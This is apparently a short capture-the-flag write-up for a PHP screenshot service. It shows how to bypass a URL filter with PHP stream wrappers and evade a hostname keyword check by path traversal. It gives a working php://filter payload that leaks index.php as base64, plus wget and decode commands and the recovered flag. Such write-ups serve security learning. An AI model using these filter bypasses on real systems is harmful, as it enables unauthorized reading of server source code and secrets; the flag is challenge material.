"""
Developer is generating screenshots using internal api servers , flag is the front server hostname (not the api hostname) , can you extract it ??"
"""

while trying this `GET /screenshot/?url=/pwn&server=http://internalapi7.local HTTP/1.1` 
it gives an error `file_get_contents(): php_network_getaddresses: getaddrinfo failed: Name or service not knownfile_get_contents(http://internalapi1.local/pwn): failed to open stream: php_network_getaddresses: getaddrinfo failed: Name or service not known
`
so basically its LFI vuln, beside the url filter its check for keyword "internalapi[1-9]\.local".

1. to bypass URL filter just use php wrapper : php:// , data:// , expect:// ...
[wrappers](https://www.php.net/manual/en/wrappers.php)

2. to bypass keyword ckeck just put it on path  : internalapi7.local/../index.php

payload : php://filter/convert.base64-encode/resource=internalapi7.local/../index.php

===> gives us path to image contains content of 'index.php' just wget it and base64 decode :

wget http://ec2-54-184-225-39.us-west-2.compute.amazonaws.com/screenshot/thumbs/2adb4e1cccb57d5b6aed3a9b2ea7e853.jpg -O index.php.txt

cat index.php.txt | base64 -d > index.php

FLAG : 
Server!Host@Flag

